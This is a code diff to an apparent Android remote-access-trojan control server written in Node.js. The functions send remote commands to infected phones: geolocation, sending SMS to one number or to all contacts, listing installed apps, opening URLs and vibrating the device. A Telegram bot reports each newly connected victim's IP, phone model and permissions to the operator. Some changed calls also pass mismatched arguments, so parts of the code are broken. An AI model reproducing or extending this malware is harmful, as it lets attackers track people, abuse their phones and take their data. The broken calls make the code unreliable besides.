@@ -67,10 +67,10 @@ const getUsersByPort = async (portname, callback = () => {}) => {
     })
 }
 
-const getSafeUsersByPort = async (portname, callback = () => {}) => {
+const getSafeUsersByPort = async (portname, password, callback = () => {}) => {
     let found_users = [];
     for (let user of accepted_users){
-        if (user.port.name == portname){
+        if (user.port.name == portname && user.port.password == password){
             found_users.push({
                 command: `/sign_${user.device_id}`,
                 accessory: user.access,
@@ -106,8 +106,8 @@ const getUserByDeviceId = async (portname, devid, callback = () => {}) => {
     })
 }
 
-const getSafeUserByDeviceId = async (portname, devid, shortcut, callback = () => {}) => {
-    await getSafeUsersByPort(portname, async (allusers) => {
+const getSafeUserByDeviceId = async (portname, password, devid, shortcut, callback = () => {}) => {
+    await getSafeUsersByPort(portname, password, async (allusers) => {
         for (let user of allusers.users){
             if (user.device_id == devid){
                 callback({
@@ -131,13 +131,10 @@ const getSafeUserByDeviceId = async (portname, devid, shortcut, callback = () =>
 }
 
 const openUrl = async (portname, passname, devid, url, shortcut, callback = () => {}) => {
-    await getUsersByPort(portname, async (allusers) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
         let found = null;
-        for (let user of allusers.users){
-            if (user.device_id == devid){
-                found = user;
-                return;
-            }
+        if (user.status == true){
+            found = user.user;
         }
 
         if (found == null){
@@ -193,14 +190,13 @@ const openUrl = async (portname, passname, devid, url, shortcut, callback = () =
 }
 
 const vibratePhone = async (portname, passname, devid, shortcut, callback = () => {}) => {
-    await getUsersByPort(portname, async (allusers) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
         let found = null;
-        for (let user of allusers.users){
-            if (user.device_id == devid){
-                found = user;
-                return;
-            }
+
+        if (user.status == true){
+            found = user.user;
         }
+
         if (found == null){
             callback({
                 status: false,
@@ -251,13 +247,10 @@ const vibratePhone = async (portname, passname, devid, shortcut, callback = () =
 }
 
 const sendToast = async (portname, passname, devid, toast, shortcut, callback = () => {}) => {
-    await getUsersByPort(portname, async (allusers) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
         let found = null;
-        for (let user of allusers.users){
-            if (user.device_id == devid){
-                found = user;
-                return;
-            }
+        if (user.status == true){
+            found = user.user;
         }
 
         if (found == null){
@@ -313,13 +306,10 @@ const sendToast = async (portname, passname, devid, toast, shortcut, callback = 
 }
 
 const getGeoLocation = async (portname, passname, devid, shortcut, callback = () => {}) => {
-    await getUsersByPort(portname, async (allusers) => {
+    await getSafeUserByDeviceId(portname, devid, async (user) => {
         let found = null;
-        for (let user of allusers.users){
-            if (user.device_id == devid){
-                found = user;
-                return;
-            }
+        if (user.status == true){
+            found = user.user;
         }
 
         if (found == null){
@@ -375,13 +365,10 @@ const getGeoLocation = async (portname, passname, devid, shortcut, callback = ()
 }
 
 const sendSMSAll = async (portname, passname, devid, sms, callback = () => {}) => {
-    await getUsersByPort(portname, async (allusers) => {
+    await getSafeUserByDeviceId(portname, devid, async (user) => {
         let found = null;
-        for (let user of allusers.users){
-            if (user.device_id == devid){
-                found = user;
-                return;
-            }
+        if (user.status == true){
+            found = user.user;
         }
 
         if (found == null){
@@ -432,13 +419,10 @@ const sendSMSAll = async (portname, passname, devid, sms, callback = () => {}) =
 }
 
 const sendSMS = async (portname, passname, devid, sms, tonumber, callback = () => {}) => {
-    await getUsersByPort(portname, async (allusers) => {
+    await getSafeUserByDeviceId(portname, devid, async (user) => {
         let found = null;
-        for (let user of allusers.users){
-            if (user.device_id == devid){
-                found = user;
-                return;
-            }
+        if (user.status == true){
+            found = user.user;
         }
 
         if (found == null){
@@ -493,19 +477,23 @@ const sendSMS = async (portname, passname, devid, sms, tonumber, callback = () =
 
 const getInstalledApps = async (portname, passname, devid, callback = () => {}) => {
     await getUserByDeviceId(portname, devid, async (user) => {
-        if (!user.status){
-            user.device_id = devid;
-            callback(user);
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "getInstalledApps",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
             return;
         }
 
-        user.socket.write(JSON.stringify({
+        user.user.socket.write(JSON.stringify({
             port: portname,
             password: passname,
             method: "getInstalledApps"
         }));
 
-        user.socket.on("data", async (data) => {
+        user.user.socket.on("data", async (data) => {
             let _message = JSON.parse(data.toString());
             if (_message.method == "getInstalledApps"){
                 if (_message.port == portname && _message.password == passname){
@@ -526,7 +514,7 @@ const getInstalledApps = async (portname, passname, devid, callback = () => {}) 
                         return;
                     }
                 } else {
-                    user.socket.write(JSON.stringify({
+                    user.user.socket.write(JSON.stringify({
                         status: false,
                         method: _message.method,
                         message: "INVALID_PORT_OR_PASSWORD",
@@ -538,6 +526,8 @@ const getInstalledApps = async (portname, passname, devid, callback = () => {}) 
 
     })
 }
+
+
 
 const server = net.createServer(async (socket) => {
     socket.on('data', async (data) => {
@@ -570,13 +560,13 @@ const server = net.createServer(async (socket) => {
                             }
 
                             if (message.method == "getUsers"){
-                                await getSafeUsersByPort(message.port, async (allusers) => {
+                                await getSafeUsersByPort(message.port, message.password, async (allusers) => {
                                     socket.write(JSON.stringify(allusers));
                                 })
                             }
 
                             if (message.method == "getUserByDeviceId"){
-                                await getSafeUserByDeviceId(message.port, message.device_id, message.shortcut, async (user) => {
+                                await getSafeUserByDeviceId(message.port, message.password, message.device_id, message.shortcut, async (user) => {
                                     socket.write(JSON.stringify(user));
                                 })
                             }
@@ -659,7 +649,7 @@ const server = net.createServer(async (socket) => {
                             
                             await cli.sendMessage(
                                 prt.port.chat_id,
-                                build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + build(`\n🌐 𓏺|𓏺 ip: ${message.ip} - `) + `<code>${message.ip}</code>\n` + build(`👔 𓏺|𓏺 rat: ${message.rat}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found`),
+                                build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + build(`\n🌐 𓏺|𓏺 ip: ${message.ip} - `) + `<code>${message.ip}</code>\n` + build(`👔 𓏺|𓏺 rat: ${message.rat}\n🗼 𓏺|𓏺 android-version: ${message.android_version}\n📱 𓏺|𓏺 model: `) + message.model + build(`\n🔋 𓏺|𓏺 battery is %${message.battery}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found\n\n🍁 𓏺|𓏺 `) + `<a href='https://t.me/Vex_Bite'>${build("universe got big plans for us")}</a>`,
                                 {
                                     parse_mode: "HTML"
                                 }
